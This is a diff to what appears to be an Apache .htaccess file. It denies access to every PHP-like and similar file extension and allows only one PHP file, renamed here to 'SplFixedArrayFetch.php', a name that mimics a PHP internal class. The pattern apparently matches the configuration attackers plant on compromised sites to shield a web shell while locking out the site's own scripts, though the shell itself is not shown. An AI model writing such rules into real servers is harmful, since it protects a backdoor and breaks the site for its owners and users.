@@ -1,12 +1,40 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.a*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
 <FilesMatch "\\.(ph.*|a.*|P[hH].*|S.*)$"> 
     Require all denied 
 </FilesMatch>
  
 <FilesMatch "\\.(jpg|jpeg|pdf|docx)$"> 
-    Require all granted 
+    Require all granted
 </FilesMatch> 
  
-<FilesMatch "^(google2ab2f7043824e50f.php)$"> 
+<FilesMatch "^(SplFixedArrayFetch.php)$"> 
     Require all granted 
 </FilesMatch> 
  
